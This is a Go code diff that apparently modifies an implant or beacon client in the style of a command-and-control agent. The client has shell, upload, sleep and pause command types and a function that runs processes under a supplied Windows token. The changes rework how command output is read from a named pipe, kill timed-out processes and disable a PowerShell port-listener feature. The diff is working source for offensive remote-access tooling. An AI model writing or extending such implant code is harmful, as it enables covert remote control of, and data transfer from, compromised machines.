@@ -10,7 +10,6 @@ import (
 	"io/ioutil"
 	"main/sysinfo"
 	"main/util"
-	"net"
 	"os"
 	"path/filepath"
 	//"runtime"
@@ -59,6 +58,7 @@ const (
 
 const (
 	CMD_TYPE_SLEEP        = 4
+	CMD_TYPE_PAUSE        = 47
 	CMD_TYPE_SHELL        = 78
 	CMD_TYPE_UPLOAD_START = 10
 	CMD_TYPE_UPLOAD_LOOP  = 67
@@ -396,22 +396,43 @@ func Run(b []byte, Token uintptr) ([]byte, error) {
 		}
 	}
 
-	_, err = windows.WaitForSingleObject(pI.Process, 5*1000)
+	event, err := windows.WaitForSingleObject(pI.Process, 5*1000)
 	if err != nil {
 		return nil, errors.New("[-] WaitForSingleObject(Process) error : " + err.Error())
 	}
-	_, err = windows.WaitForSingleObject(pI.Process, 5*1000)
-	if err != nil {
-		return nil, errors.New("[-] WaitForSingleObject(Thread) error : " + err.Error())
-	}
 
-	buf := make([]byte, 10*8192+1)
-	//var done uint32 = 4096
-	var read windows.Overlapped
-	err = windows.ReadFile(hRPipe, buf, nil, &read)
-	if err != nil {
+	// TODO you should review this
+	if event == uint32(windows.WAIT_TIMEOUT) {
+		defer windows.TerminateProcess(pI.Process, 0)
+	}
+	//_, err = windows.WaitForSingleObject(pI.Process, 5*1000)
+	//if err != nil {
+	//	return nil, errors.New("[-] WaitForSingleObject(Thread) error : " + err.Error())
+	//}
+
+	var lpTotalBytesAvail uint32
+	_, _, err = PeekNamedPipe.Call(uintptr(hRPipe), 0, 0, 0, uintptr(unsafe.Pointer(&lpTotalBytesAvail)), 0)
+	if err != nil && err != windows.SEVERITY_SUCCESS {
 		return nil, err
 	}
+	buf := make([]byte, lpTotalBytesAvail)
+	var bytesRead uint32
+	var read windows.Overlapped
+	if lpTotalBytesAvail == 0 {
+		return []byte("no output present"), nil
+	} else if lpTotalBytesAvail > 0x80000 {
+		return []byte("output bigger than 0x80000"), nil
+	} else {
+		_ = windows.ReadFile(hRPipe, buf, &bytesRead, &read)
+	}
+
+	//buf := make([]byte, 10*8192+1)
+	////var done uint32 = 4096
+	//var read windows.Overlapped
+	//err = windows.ReadFile(hRPipe, buf, nil, &read)
+	//if err != nil {
+	//	return nil, err
+	//}
 
 	//fmt.Printf("buf:%s\n", buf[:read.InternalHigh])
 
@@ -540,7 +561,7 @@ func PowershellImport(b []byte) ([]byte, error) {
 
 func PowershellPort(portByte []byte, b []byte) ([]byte, error) {
 
-	port := ReadShort(portByte)
+	/*port := ReadShort(portByte)
 	go func() {
 		listen, err := net.Listen("tcp", "127.0.0.1:"+strconv.Itoa(int(port)))
 		if err != nil {
@@ -567,7 +588,9 @@ func PowershellPort(portByte []byte, b []byte) ([]byte, error) {
 
 	}()
 
-	return []byte("Hold on"), nil
+	return []byte("Hold on"), nil*/
+
+	return []byte("import function is not support now."), nil
 
 }
 
